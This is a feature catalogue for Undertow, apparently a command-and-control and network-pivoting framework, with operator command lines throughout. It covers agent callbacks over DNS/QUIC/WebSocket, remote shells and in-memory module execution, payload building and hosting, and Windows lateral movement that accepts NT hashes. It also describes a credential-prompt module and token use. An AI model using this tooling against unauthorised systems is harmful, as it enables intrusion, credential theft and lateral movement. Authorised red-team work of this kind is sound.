# Undertow feature catalogue

The [GUI user guide](docs/gui.md) is the everyday operator guide. This catalogue indexes implemented capabilities and retains terminal examples. Bootstrap the first Team Leader before starting a fresh server. Every client needs an operator account as well as enrollment; interactive starts prompt for missing account values, while noninteractive starts need explicit account flags or environment values. See [Getting started](docs/getting-started.md) and [Operator accounts](docs/operator-authentication.md).

Undertow runs on **Linux and Windows**. The commands below use `undertow` as the executable name; substitute `./bin/undertow` on Linux or `.\bin\undertow.exe` in Windows PowerShell. Replace `SERVER_IP`, `FINGERPRINT`, `AGENT_ID`, and example network addresses with values from your deployment. A line labeled **Server** runs on the Undertow server host; **Agent** runs on a host inside the target network; **VPN client** runs on the host whose applications will use the tunnel; **Other internal host** is a machine reached through the agent. In a terminal, `undertow server` and `undertow client` open their consoles automatically.

The fastest internal-only setup needs no server route configuration: start the server and agent, connect a client with `--internal`, then use `agents`, `use 1`, `routes`, and `route accept CIDR` in the **VPN client** console. Use `route add CIDR` there for a known network that was not reported. The server needs `--tun` only if applications on the server host itself need routed access through an agent.

## Find each capability

| Capability | GUI location or command-line path | Guide |
| --- | --- | --- |
| Build, initialise, start roles | OS terminal startup flags | [Getting started](docs/getting-started.md) · [CLI](docs/cli-reference.md) |
| Enrollment and server identity pinning | Client startup and payload profiles | [Authentication](docs/getting-started.md#enrollment-choices) |
| Operator accounts and roles | Settings → Identity; console `operators` | [Operator accounts](docs/operator-authentication.md) |
| Operator-only access | Client `--operator-only` | [Client modes](docs/networking-modes.md#choose-a-client-mode) |
| Topology and detailed telemetry | Topology; Overview; Settings → Status; console `show` | [GUI topology](docs/gui.md#read-the-topology) · [CLI telemetry](docs/cli-reference.md#operator-commands) |
| Nicknames, archives, retained agents | Agent Rename/Overview; Settings → Agents | [Agent selection](docs/gui.md#choose-and-identify-an-agent) · [Cleanup](docs/gui.md#settings-history-and-cleanup) |
| Built-in host and file operations | Agent Host/Console | [Host operations](docs/console.md#built-in-agent-host-operations) |
| One-shot OS execution | Agent Console `exec` | [Execution](docs/gui.md#run-a-command-in-console) |
| Interactive processes | Agent Live shell; terminal `shell` | [Live shell](docs/gui.md#open-a-live-shell) |
| Background work and full output | Agent/sidebar Jobs; console `job` | [Jobs](docs/gui.md#start-and-follow-background-jobs) |
| Memory-backed Bash/PowerShell scripts | Console `run-script` | [Scripts](docs/console.md#server-console) |
| Packaged/imported tools and help | Agent/sidebar Modules; console `load`, `modules`, named commands | [Module bank](docs/module-bank.md) |
| WASM, native, BOF, .NET runtimes | Modules or Console `run-*` | [WASM](docs/wasm-development.md) · [Native](docs/native-modules.md) · [BOF](docs/bof-compatibility.md) · [.NET](docs/assembly-modules.md) |
| Files emitted by BOFs | Received files in Modules/Console/Job detail; terminal `job file` | [BOF files](docs/bof-compatibility.md#in-memory-file-callbacks) |
| Directory browsing and verified transfers | Agent Files; sidebar Transfers; console `upload`/`download` | [Files](docs/gui.md#browse-and-transfer-files) |
| Display enumeration and captures | Agent Screenshots; console `screens`/`screenshot` | [Screenshots](docs/gui.md#capture-and-view-screenshots) |
| Internet VPN and global internal routing | Settings → Client; console `vpn`/`internal` | [Modes](docs/networking-modes.md) |
| Accepted/custom client routes and toggles | Routes or Overview; console `route` | [Routing](docs/gui.md#reach-a-remote-network-from-your-machine) |
| Server routes and server-host TUN | Routes → Server configured routes; server `--tun` | [Server routing](docs/networking-modes.md) |
| TCP/UDP/ICMP access and multiple agents | Route selection and ordinary client applications | [Scenarios](docs/scenarios.md) |
| Server-local TCP forwarding without TUN | Server `--forward LOCAL=REMOTE --via-agent ID` | [Server forward](docs/scenarios.md#3-forward-one-local-tcp-port-without-a-tun) |
| Agent listeners to client TCP services | Forwards; console `forward` | [Remote forwarding](docs/remote-port-forwarding.md) |
| TCP/SMB child-agent relays | Relays; console `relay` | [Relays](docs/topology-and-relays.md) · [SMB](docs/smb-named-pipe-relays.md) |
| Profiles, builds, downloads, custom uploads | Payloads; console `payload` for build/management | [Deployment](docs/agent-distribution.md#build-and-deliver-from-the-gui) |
| Server/parent-hosted delivery and helpers | Payloads → Artifacts; console `payload host*` | [Delivery](docs/agent-distribution.md) |
| Retrieval host/path and URL rotation | Payloads → Retrieval settings; console `payload retrieval-*` | [Retrieval settings](docs/agent-distribution.md#build-and-deliver-from-the-gui) |
| Windows Jump and enrollment correlation | Jump; agent Create from this agent; console `jump` | [Windows Jump](docs/windows-deployments.md) |
| Capability policy | Payload profiles; manual agent `--deny` | [Capabilities](#granular-agent-capabilities) |
| Continuous/check-in policy | Overview; Payload profiles; console `agent sleep` | [Connection rhythm](docs/gui.md#understand-agent-connection-rhythm) |
| DNS/QUIC/WebSocket listeners | Settings → Carriers; console `transports` | [Carriers](docs/networking-modes.md#choose-another-carrier) |
| Carrier identities and reconnect tuning | CLI `--deployment-profile`; payload profile fields | [Deployment profiles](docs/deployment-profiles.md) |
| Shared/direct messages and assignments | Team; console `team` | [Team](docs/gui.md#team-conversations-and-assignments) |
| Audit, retained results, worker/lifecycle logs | History; result views; Settings → Logs; `agent events` | [History](docs/gui.md#settings-history-and-cleanup) |
| Detach, attach, stop, shutdown, revoke | Terminal lifecycle; Overview; artifact controls | [Lifecycle](docs/cli-reference.md#foreground-and-background-lifecycle) · [Payload effects](docs/agent-distribution.md#inspect-and-manage-lifecycle) |
| Doctor, probes, examples, BOF inspection, JSON | OS terminal commands and probe flags | [CLI](docs/cli-reference.md) · [BOF inspection](docs/bof-compatibility.md#inspect-and-run) |

Operational records are shared on the server. Route choices, module banks, graph layout, and bounded Console history belong to each client. Direct conversations are limited to their two participants. Read [Data ownership and cleanup](docs/gui.md#settings-history-and-cleanup) when planning handoffs.

## Roles and identity

### Server role

The server accepts DNS, HTTPS/WebSocket, or QUIC sessions, authenticates agents and clients, owns the local operator API, and routes traffic to server sockets or selected agents. Its proxy TUN is optional.

```text
Server: undertow init
Server: sudo undertow server
Server: sudo undertow status
```

### Agent role

An agent joins from an internal host, advertises reachable networks, and opens ordinary TCP, UDP, and ICMP sockets on behalf of the server. It does not install a TUN or change its own routes.

```text
Agent: undertow agent --transport quic --server SERVER_IP:443 --fingerprint FINGERPRINT --tls-insecure-skip-verify
Server: sudo undertow agent list
```

### Client role

A client hosts the GUI and console and connects independently of agents. Operator-only mode needs no tunnel or elevation. Routing modes create a privileged TUN/Wintun for this machine's applications: choose `--vpn`, `--internal`, or both.

```text
VPN client: sudo undertow client --internal --transport quic --server SERVER_IP:443 --fingerprint FINGERPRINT --tls-insecure-skip-verify
VPN client console: agents
```

### Transport choices and encrypted multiplexing

The server starts DNS UDP/53, WebSocket TCP/443 and QUIC UDP/443 together by default. `--transport dns,quic` selects a subset and `--transport quic` keeps single-carrier startup. Each agent and client independently chooses one active carrier; mixed carriers share one server identity, enrollment policy, route table, job manager and console. The peer CLI defaults to DNS, so explicitly select `--transport quic` or `--transport websocket` when using those paths. DNS VPN is useful when direct UDP/53 is the available outbound path, including some restrictive or captive portal networks. WebSocket suits HTTPS and HTTP CONNECT proxy paths; QUIC uses UDP/443. WebSocket and QUIC use ephemeral self-signed TLS by default or explicit `--tls-cert`/`--tls-key` files. Peers verify TLS and independently pin the Undertow Ed25519 fingerprint. The server or connected client console can list and manage listeners with `transports`, `start transport NAME`, and `stop transport NAME [force]`. A client cannot stop the carrier carrying its own session. See [networking mode and carrier choices](docs/networking-modes.md#choose-another-carrier) and the [CLI reference](docs/cli-reference.md#transport-selection).

The same authenticated session, mux, routing, jobs, file transfer, and console operations run over all three carriers. WebSocket uses a persistent TLS connection; QUIC uses a bidirectional stream over UDP/443. DNS keeps its own adaptive wire behavior.

### Direct DNS details

The carrier is direct DNS over UDP to the configured numeric server address and domain. It does not depend on a recursive resolver or iodine. An authenticated encrypted session carries mux streams for network flows, commands, files, and control traffic. DNS polling, outstanding queries, fragment size, send window, and receive window adapt to path conditions.

```text
Server: sudo undertow server --domain t.example.invalid --identity identity.key --token-file token.key
Agent: undertow agent --transport dns --server SERVER_IP:53 --domain t.example.invalid --fingerprint FINGERPRINT --token-file token.key --payload-profile auto
```

`--payload-profile auto` discovers and adjusts a 128–800 byte fragment size. `large` and `small` explicitly select legacy 800 and 320 byte profiles for compatibility. `agent show` exposes transport windows, RTT, retransmits, duplicates, and payload adjustments.

### Authentication and enrollment

Token enrollment is the default: `init` creates a random `token.key` for distribution to agents and VPN clients. Password enrollment uses `--auth password` with a password file. Open enrollment uses `--auth none` for agents; clients still require server-managed operator accounts. See [operator authentication](docs/operator-authentication.md).

```text
Server: undertow init --identity identity.key --token-file token.key
Server: sudo undertow server --auth token --token-file token.key
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --auth token --token-file token.key --fingerprint FINGERPRINT
VPN client: sudo undertow client --internal --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --auth token --token-file token.key --fingerprint FINGERPRINT
```

Alternative enrollment sequence:

```text
Server: sudo undertow server --auth password --password-file enrollment-password.txt
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --auth password --password-file enrollment-password.txt --fingerprint FINGERPRINT
```

For an intentionally open test listener:

```text
Server: undertow server --transport dns --listen 127.0.0.1:5353 --auth none
Agent: undertow agent --server 127.0.0.1:5353 --auth none --trust-on-first-use
```

### Agent and client keys, fingerprints, and first-use trust

The server has a persistent Ed25519 identity; each agent and client has its own persistent key. A peer pins the server fingerprint explicitly, reads a saved pin, or opts into trust on first use. The first-use pin is saved only after an authenticated connection. Keep the server identity key on the server.

```text
Server: undertow init --identity identity.key
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --agent-key agent-west.key --fingerprint FINGERPRINT --token-file token.key
VPN client: sudo undertow client --internal --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --client-key operator-client.key --trust-on-first-use --fingerprint-file server.fingerprint --token-file token.key
```

## Configured payload delivery

The server release includes thin-agent templates. A profile captures carrier and policy settings; each `payload build` creates an immutable Windows or Linux artifact with its own enrollment secret. Each running copy creates an independent agent identity. `payload host` creates a private HTTPS retrieval URL for a headless endpoint. `payload deploy-script` prints a SHA-256-verifying installer for PowerShell or a POSIX shell. The packaged agent starts without command-line connection settings or local runtime state. See the [first-run workflow](docs/getting-started.md#3-build-host-and-deploy-a-headless-windows-agent) and [payload deployment](docs/agent-distribution.md).

`payload download PAYLOAD_ID [OUTPUT]` is the alternate delivery path: it copies the built binary to the current console host over the authenticated control connection and verifies its SHA-256. It works before hosting and refuses to replace a file. A connected VPN client can manage profiles and builds, including downloading payloads. `payload unhost`, `payload revoke`, and `payload delete` separately disable public retrieval, future enrollment, and the server artifact. `agent events`, `session kill`, and `agent shutdown` cover a connected agent's lifecycle.

For agents that connect through a relay or private address, `payload retrieval-host set PUBLIC_SERVER_HOST` sets the HTTPS download host independently of the embedded agent connection address. The setting persists on the server and applies to hosted URL display and deploy scripts; see [public download host](docs/agent-distribution.md#public-https-download-host).

An operator can enable an opaque HTTPS artifact URL on an existing TCP relay listener with `payload host-agent`. The parent agent fetches each artifact over its current Undertow session; the server retains the binary. Stopping that URL leaves the child relay running. See [agent-hosted distribution](docs/agent-distribution.md#host-a-payload-through-a-connected-agent).

## Windows Jump

Jump deploys an existing Windows artifact from an existing Windows source agent to another Windows host. The operator creates and prepares a durable record, then starts one source-agent Job using WinRM, WMI, Service Control, or Scheduled Task. A source agent in intentional check-in sleep remains selectable: its Job queues on the server and dispatches on the next authenticated callback.

The server streams the artifact through the source agent to the target administrative share and verifies its SHA-256. The default target is `C:\Windows\Temp\<random>.exe`, written through `ADMIN$\Temp`; an operator may supply another absolute `.exe` path. Start uses the source Windows identity by default or accepts a target-local username, `DOMAIN\user`, or UPN with a password. WMI, Service Control, and LocalSystem Scheduled Task also accept an NT hash. The supplied secret is held in server memory only until dispatch and never enters a Job command line or durable record. Jump does not require artifact hosting or target-side retrieval. Jobs retain method output, Transfers retain delivery progress, History records operator actions, and a matching later enrolment completes the record and adds its `deployed_from` relationship to Topology.

```text
Agent console: jump create TARGET ARTIFACT_ID winrm current-user
Agent console: jump prepare JUMP_ID
Agent console: jump start JUMP_ID
Agent console: jump show JUMP_ID
```

Service Control uses LocalSystem and requires a service-capable artifact. Scheduled Task supports LocalSystem or current user; WinRM and WMI use current user. See [Windows Jump](docs/windows-deployments.md) for source compatibility, method prerequisites, states, cleanup, result correlation, GUI workflow, and the HTTP API.

## Routing and network traffic

### Full IPv4 VPN mode

`--vpn` installs `0.0.0.0/1` and `128.0.0.0/1` on the client, pins the physical server route, and verifies public egress by default. The server uses its own sockets for Internet traffic. IPv6 is outside this mode.

```text
VPN client: sudo undertow client --vpn --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key
VPN client: curl -4 https://api.ipify.org
```

### Internal-only routing mode

`--internal` creates the client TUN/Wintun and pins the carrier server route without installing Internet `/1` routes or requiring a public egress check. The client's default Internet route remains in place. Accept a reported route in the client console; no server route command is needed.

```text
VPN client: sudo undertow client --internal --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key
VPN client console: agents
VPN client console: use 1
VPN client console: routes
VPN client console: route accept 10.20.0.0/16
VPN client: curl http://10.20.1.25/
```

### Combined VPN and internal mode

Combine both flags to use server Internet egress and accepted or server-configured internal paths at once.

```text
VPN client: sudo undertow client --vpn --internal --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key
VPN client console: use 1
VPN client console: route accept 10.20.0.0/16
VPN client: curl -4 https://api.ipify.org
VPN client: curl http://10.20.1.25/
```

### Server-side TUN and server-host pivots

`server --tun` creates an optional proxy TUN/Wintun so applications on the **Server** host can use a configured route through an agent. A global server route is appropriate here; it is optional for a separate VPN client's own accepted routes.

```text
Server: sudo undertow server --tun --tunnel-address 172.16.254.1/24 --identity identity.key --token-file token.key
Server console: agents
Server console: use 1
Server console: route add 10.20.0.0/16
Server: curl http://10.20.1.25/
```

### Client TUN/Wintun and route ownership

Linux clients use TUN; Windows clients use Wintun. Undertow checks for local tunnel-network collisions, installs only the routes owned by the chosen mode, and removes owned routes on graceful exit.

```text
VPN client (Linux): sudo undertow client --internal --tun-name undertow-vpn --tunnel-address 172.16.253.1/24 --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key
VPN client console: quit
```

### Agent pivoting over TCP, UDP, and ICMP

The agent opens target sockets from its own network. TCP supports ordinary application flows; UDP uses datagram bridging; ICMP supports echo. Host privileges and network firewalls still apply.

```text
VPN client console: use 1
VPN client console: route accept 10.20.0.0/16
VPN client: curl http://10.20.1.25:8080/
VPN client: dig @10.20.1.53 example.internal
VPN client: ping 10.20.1.25
Other internal host: listen on 10.20.1.25:8080 for the HTTP example
```

### Multi-agent routing

Several agents can be connected at once. The client selects the target agent per accepted route; the server's global route table also binds each prefix to one agent. `agents` and `show` distinguish their identities, networks, and state.

```text
Agent on network A: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --agent-key east.key --fingerprint FINGERPRINT --token-file token.key
Agent on network B: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --agent-key west.key --fingerprint FINGERPRINT --token-file token.key
VPN client console: agents
VPN client console: use 1
VPN client console: route accept 10.20.0.0/16
VPN client console: use 2
VPN client console: route accept 10.30.0.0/16
```

### Route advertisements and structured discovery

An agent automatically offers up IPv4 interface networks and can explicitly advertise more prefixes. Its inventory also reports discovered IPv4 routes with destination, gateway, interface, type/source, and direct-versus-routed state; its default route is separate. The client console presents candidates but never installs all discovered routes automatically.

```text
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key --advertise-route 10.40.0.0/16
VPN client console: use 1
VPN client console: routes
VPN client console: show
VPN client console: route accept 10.40.0.0/16
```

### Manual and client-specific accepted routes

`route accept CIDR` chooses an advertised or discovered candidate. `route add CIDR` manually chooses a network the agent can reach. These choices are local to one VPN client, persist in `client-routes.json`, and return after reconnect. The client checks local-network and DNS-server collisions. Remove one with `route del`.

```text
VPN client console: use 1
VPN client console: route add 10.50.0.0/16
VPN client console: routes
VPN client console: route del 10.50.0.0/16
```

### Global server routes

The server operator can configure a prefix for server-host pivots and for clients using the global internal mode. A route becomes inactive when its agent disconnects. Client-owned accepted routes remain separate.

```text
Server console: agents
Server console: use 1
Server console: route add 10.20.0.0/16
Server console: routes
Server console: route del 10.20.0.0/16
VPN client console: internal on
```

For scripts, use `undertow route add CIDR --via AGENT_ID`, `undertow route list`, and `undertow route del CIDR` on the server host.

### Server local TCP forwards

`server --forward` listens on a local TCP address and sends each connection to a target reached through the chosen agent. It can be repeated for several listeners.

```text
Server: sudo undertow server --forward 127.0.0.1:8080=10.20.1.25:80 --via-agent AGENT_ID --identity identity.key --token-file token.key
Server: curl http://127.0.0.1:8080/
Other internal host: serve HTTP on 10.20.1.25:80
```

### Agent-side TCP listener forwards back to client services

A VPN client can ask one selected agent to listen on a TCP address and relay connections to a loopback service on that client. Multiple forwards and agents are supported. `--deny=listeners` on the agent rejects new listeners. A forward survives client console detach, and its listener closes when the owning client or agent session disconnects.

Follow [remote port forwarding](docs/remote-port-forwarding.md) for the full client-to-agent workflow, multiple services, verification, and cleanup.

```text
VPN client: python3 -m http.server 8080 --bind 127.0.0.1
VPN client console: use 1
VPN client console: forward add 0.0.0.0:8080 127.0.0.1:8080
VPN client console: forward list
Other internal host: curl http://AGENT_IP:8080/
VPN client console: forward del 0.0.0.0:8080
```

### Explicit multi-hop agent relays

An operator can select an agent in the server or connected client console and type `relay start INTERNAL_IP:PORT`. That agent then accepts child-agent TCP connections on the requested interface only and carries them over its own Undertow session to the original server. A child uses `agent --transport relay --server INTERNAL_IP:PORT` with the original server fingerprint and token and its own private key. It appears independently in `agents`, `show`, `topology`, routes, shell/exec, files, scripts, WASM, jobs and forwards. Children can host their own explicitly requested relays to a maximum of eight links. Parent loss closes descendants and deactivates their routes. `relay list` and `relay stop [BIND]` manage the selected agent's listener; `--deny=relay` refuses one. A client on QUIC can therefore reach a child behind a DNS-connected parent without changing the parent or client carrier. See [topology and relays](docs/topology-and-relays.md).

On Windows, `relay start \\.\pipe\NAME` opens a named-pipe alternative. A Windows child uses `--transport relay-smb --server \\PARENT_HOST\pipe\NAME`; the server records its carrier as `relay-smb`. The pipe requires Windows/SMB access, while Undertow still performs its normal end-to-end identity and enrollment handshake. See [SMB named-pipe relays](docs/smb-named-pipe-relays.md).

## Agent operations

### One-shot arbitrary execution

`exec` starts the named program directly, without an implicit shell. It has a 30-second limit and bounded stdout/stderr. The `exec` capability controls it independently of other agent operations.

```text
VPN client console: use 1
VPN client console: exec /usr/bin/id
VPN client console: exec powershell.exe -NoProfile -Command whoami
```

### Built-in host operations

The built-ins are `pwd`, `ls`, `stat`, `mkdir`, `rm`, `whoami`, `ps`, `privileges`, `env`, `interfaces`, `dns`, `route-table`, and Windows `screens`. They use the independent `hostops` capability; denying `exec` does not deny them.

```text
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key --deny=exec
VPN client console: use 1
VPN client console: whoami
VPN client console: interfaces
VPN client console: route-table
```

On a Windows agent, `screens` lists numbered displays and the frontmost visible application on each. `screenshot` captures all displays; `screenshot NUMBER` captures one. PNGs are transferred to the initiating VPN client's ignored `outputs/screenshots/` directory. Use `--output DIRECTORY` to choose another location. Captures need an accessible interactive desktop and the `hostops` and `download` capabilities. See the [console guide](docs/console.md#windows-display-screenshots).

### Long-lived interactive sessions

`shell` opens one bidirectional mux stream to the selected agent. Linux uses a PTY with size updates; Windows uses interactive process pipes. Choose another program after `shell`; Ctrl-] closes that shell and returns to the Undertow menu without affecting other streams. The separate `interactive` capability controls this operation.

```text
VPN client console: use 1
VPN client console: shell /bin/bash
VPN client shell: printf 'ready\n'
VPN client keyboard: Ctrl-]
VPN client console: shell powershell.exe -NoProfile
```

### Long-running jobs

Jobs run while the operator uses or detaches the console. They have unique IDs, agent association, start/end times, running/completed/failed/cancelled state, and exit status. Output stays in memory through 256 KiB, then spills to a server file up to configurable per-job and total limits. `job output` previews it, `job save` downloads the full output, and `job delete` removes a finished record and its output. Authenticated connected clients can inspect the shared job records; the server operator can also see all. Command jobs use the `interactive` agent capability; background script, WASM, native, and BOF jobs use their respective capabilities.

```text
VPN client console: use 1
VPN client console: job start /usr/bin/find /srv -type f
VPN client console: jobs
VPN client console: job show JOB_ID
VPN client console: job output JOB_ID
VPN client console: job save JOB_ID
VPN client console: job cancel JOB_ID
VPN client console: job delete JOB_ID
```

### Memory-backed script execution

`run-script` reads a local file on the VPN client or server operator machine, sends its source through the encrypted Undertow session, and streams it into Bash or PowerShell stdin on the selected agent. The agent does not create a script file. Stdout and stderr stream separately for foreground runs; background runs use the same bounded job store as command jobs. Source is limited to 1 MiB and runtime to 10 minutes. The independent `scripts` capability controls both forms.

```text
VPN client: printf 'id\n' > check.sh
VPN client console: use 1
VPN client console: run-script bash ./check.sh
VPN client console: run-script --background bash ./check.sh
VPN client console: job output JOB_ID
Server: printf 'whoami\n' > audit.ps1
Server console: use AGENT_ID
Server console: run-script powershell ./audit.ps1
```

### In-process WebAssembly execution

`run-wasm` sends a WASI module through Undertow and instantiates it directly from memory in the agent's pure-Go runtime. It needs no temporary module file. The console can supply arguments and optional stdin; stdout and stderr stream separately. Background WASM runs use the same job manager, including bounded retained output and cancellation. The independent `wasm` capability controls this operation. Agent limits are a 4 MiB module, 64 KiB stdin, 16 MiB guest linear memory, 4 MiB combined output, a two-minute runtime and two simultaneous runs. No filesystem is preopened and no WASI network socket is supplied to the guest. Any module can call the versioned `undertow_host_v1` imports for agent-side system, identity, process, filesystem, network and startup assessment. See the [WASM developer guide](docs/wasm-development.md) and [packaged examples](modules/wasm/README.md).

```text
VPN client console: use 1
VPN client console: run-wasm ./tool.wasm audit
VPN client console: run-wasm --stdin ./input.txt ./tool.wasm
VPN client console: run-wasm --background ./long-task.wasm
VPN client console: job output JOB_ID
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key --deny=wasm
```

### Windows native modules

`run-native` sends a `.module` container to a Windows amd64 agent and invokes its PE32+ DLL entry point through `undertow_native_v1`. The module uses ordinary Windows APIs and import libraries directly; Undertow supplies arguments, output, cancellation and run information. Foreground output and background jobs use the same console frames and job manager as WASM. `--data FILE` passes binary bytes alongside UTF-8 arguments. The independent `native` capability controls execution. The agent validates platform, architecture and ABI metadata, then uses the Windows loader to resolve System32 imports and relocations. See the [native module guide](docs/native-modules.md), [SDK](sdk/native/README.md), and [examples](modules/native/README.md).

The interactive console preloads `.o`, `.module`, and `.wasm` artifacts, plus managed `.exe`/`.dll` files under `modules/assembly/`, from its local [`modules/` bank](docs/module-bank.md) as session commands. `load bof|module|wasm|assembly FILE [NAME]` adds a command during the session; `help NAME` displays sidecar help and `modules` lists everything loaded. The same command can run on any selected compatible agent.

The native examples include [Sift](modules/native/sift/README.md) for controlled sensitive-data scanning and [askpass](modules/native/askpass/README.md) for an interactive Windows credential dialog. Askpass needs a visible user desktop and returns submitted values in module output; handle that output as sensitive data.

```text
Server console: use 1
Server console: run-native modules/native/wininfo/wininfo.module
Server console: run-native --background modules/native/hello/hello.module --wait
Server console: jobs
Server console: job stop 1
```

### .NET Framework assemblies

`run-assembly` loads a pure-IL .NET Framework 4.x `.exe` or `.dll` from transferred bytes in a short-lived dedicated CLR worker on a Windows amd64 agent. It accepts Unicode command-line arguments, streams `Console.Out` and `Console.Error`, and uses the normal foreground and background Jobs paths. Assemblies share the `native` capability and two-run limit; cancellation terminates the worker. PowerShell is not required. See the [.NET assembly guide](docs/assembly-modules.md).

### Beacon Object Files

On a Windows AMD64 agent, `run-bof` executes a compatible compiled COFF `.o` through the Beacon ABI. Inspect an object on the console host before use, or place it in the [module bank](docs/module-bank.md) to run it by name. BOF arguments can be typed with `--format` or a JSON sidecar. See [BOF compatibility](docs/bof-compatibility.md) for supported imports, build examples, argument formats, and limits.

```text
Server: undertow bof inspect modules/bof/Winver.x64.o
Server console: modules
Server console: use 1
Server console: bof-winver
```

### Upload and download

File transfer streams through the server to the selected agent, verifies SHA-256, and refuses to overwrite an existing destination. The client console shows bytes, total, percentage, and current rate; Ctrl-] cancels and removes partial temporary files. Upload and download permissions are separate capabilities.

```text
VPN client console: use 1
VPN client console: upload ./notes.txt /tmp/notes.txt
VPN client console: download /tmp/result.txt ./result.txt
VPN client keyboard during a transfer: Ctrl-] to cancel
```

### Granular agent capabilities

Windows token contexts are managed through the [Authentication Contexts / Tokens workspace](docs/authentication-contexts.md), with per-operation IDs and authenticated connection defaults. Tokens stay in agent memory; only metadata and opaque selections cross the server. The Windows `tokens` capability controls management and selected-token execution.

All supported capabilities are enabled by default: `tokens` (Windows), `pivot`, `exec`, `hostops`, `interactive`, `scripts`, `wasm`, `native`, `upload`, `download`, `listeners`, `relay`, `jump-credentials`, and `jump-nt-hash`. Deny any combination at agent startup; the server and agent enforce the operation at the relevant stream. `relay` allows an operator-requested child-agent listener; zero relay listeners exist until explicitly started on a selected agent. It is independent of `listeners`, which controls client-service TCP forwards. `jump-credentials` allows a Jump to use an operator-supplied Windows identity, while `jump-nt-hash` separately gates NT-hash authentication. Denying either does not affect Jumps that use the source agent identity.

```text
Agent: undertow agent --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key --deny=exec,upload
Server: sudo undertow agent show AGENT_ID
```

With this example, built-in host operations and interactive sessions still work. Add `hostops` or `interactive` to the deny list to block those separately.

## Console, lifecycle, and diagnostics

### Server and client consoles

The server console opens automatically in a terminal and uses the authenticated local loopback API. The client console also opens automatically and manages its own route acceptance, forwards, commands, jobs, and files. `agents`, `use NUMBER`, `help`, and `back` provide an agent-focused workflow.

```text
Server: sudo undertow server
Server console: agents
Server console: use 1
Server console: show
VPN client: sudo undertow client --internal --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key
VPN client console: agents
VPN client console: use 1
VPN client console: help
```

### Background, detach, and attach

Server, agent, and client support `--foreground`, `--background`, `--stop`, `--log-file`, and `--pid-file`. In a terminal, server and client open consoles by default; `--foreground` runs their workers without a console. Either console can detach with `background` while its worker continues, then attach again. On the server, `quit` detaches and `stop` shuts down; on the client, `quit` stops the client and removes owned routes.

```text
VPN client console: background
VPN client: sudo undertow client attach --pid-file undertow-client.pid
VPN client console: jobs
VPN client console: quit
Server: sudo undertow server --stop --pid-file undertow-server.pid
Agent: undertow agent --stop --pid-file undertow-agent.pid
```

To start detached from the outset:

```text
VPN client: sudo undertow client --background --internal --transport quic --server SERVER_IP:443 --tls-insecure-skip-verify --fingerprint FINGERPRINT --token-file token.key
VPN client: sudo undertow client attach
```

### Status and detailed telemetry

`status` is a compact view of agents, VPN clients, and routes. `agent show` adds hostname, OS/architecture, virtual IP, connection age, last seen, RTT, encrypted bytes and rates, retransmits, duplicates, congestion and receive windows, queued/in-flight packets, mux streams, jobs, TCP forwards, advertised networks, discovered routes/gateways, and allowed capabilities.

```text
Server: sudo undertow status
Server: sudo undertow agent show AGENT_ID
VPN client console: use 1
VPN client console: show
```

### Probe and diagnostic modes

`server --probe-echo` runs a controlled encrypted echo endpoint instead of ordinary socket service. An agent can run `--probe` with count, size, and interval for latency and transport checks. The on-demand `route-table`, `interfaces`, and `dns` built-ins inspect an agent host.

```text
Server: undertow server --transport dns --listen 0.0.0.0:5353 --probe-echo --identity identity.key --token-file token.key
Agent: undertow agent --transport dns --server SERVER_IP:5353 --fingerprint FINGERPRINT --token-file token.key --probe --probe-count 25 --probe-size 512 --probe-interval 1s
VPN client console: use 1
VPN client console: route-table
```

### JSON output and local control API

The server operator can request structured JSON for status, route lists, and one detailed agent. `--control` and `--control-token-file` target the loopback API if it was configured differently. The control token is distinct from the enrollment token and stays on the server.

```text
Server: sudo undertow status --json
Server: sudo undertow route list --json
Server: sudo undertow agent show AGENT_ID --json
```

### Cleanup, disconnect, and reconnect

On graceful client stop, Undertow removes the routes it installed. Agent disconnect deactivates its global routes and closes its TCP listeners; client disconnect closes that client's forwards. Agents and clients reconnect using their stable keys. Client route choices saved in `client-routes.json` are restored after reconnect, subject to current collision and agent checks. `session kill` disconnects one agent session for diagnostics.

```text
Server: sudo undertow session kill AGENT_ID
Server: sudo undertow status
VPN client console: background
VPN client: sudo undertow client attach
VPN client console: routes
VPN client console: quit
```

For flag details, see [CLI reference](docs/cli-reference.md); for the wire format, see [protocol](docs/protocol.md); for tested performance, see [benchmarks](docs/benchmarks.md).

Back to [documentation home](docs/README.md).
